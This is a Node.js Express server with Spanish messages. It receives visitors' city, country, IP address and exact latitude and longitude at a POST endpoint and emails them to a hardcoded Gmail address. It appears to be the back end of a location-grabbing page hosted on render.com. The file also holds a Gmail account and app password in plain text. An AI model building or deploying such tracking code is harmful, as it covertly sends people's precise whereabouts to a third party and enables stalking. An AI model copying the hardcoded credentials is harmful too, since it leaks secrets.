require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'maximilianoalderete017@gmail.com',
        pass: 'nsgx vuam sfrt hmqe'
    }
});

app.post('/enviar-ubicacion', (req, res) => {
    console.log("📩 Datos recibidos:", req.body);

    const { ciudad, pais, ip, latitud, longitud, metodo } = req.body;

    if (!latitud || !longitud) {
        return res.status(400).send("❌ Faltan datos de ubicación.");
    }

    console.log(`✅ Ubicación detectada (${metodo}): ${ciudad}, ${pais}, IP: ${ip}, Lat: ${latitud}, Lng: ${longitud}`);

    const mailOptions = {
        from: 'tuemail@gmail.com',
        to: 'maximilianoalderete017@gmail.com',
        subject: '📍 Nueva Ubicación Detectada',
        text: `🌎 Método: ${metodo}
📍 Ciudad: ${ciudad}
🏳️ País: ${pais}
💻 IP: ${ip}
📍 Latitud: ${latitud}
📍 Longitud: ${longitud}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error("❌ Error enviando correo:", error);
            return res.status(500).send('Error al enviar el correo');
        } else {
            console.log("✅ Correo enviado:", info.response);
            return res.status(200).send("Ubicación enviada correctamente");
        }
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(3000, () => {
    console.log('🚀 Servidor corriendo en https://gail.onrender.com/');
});
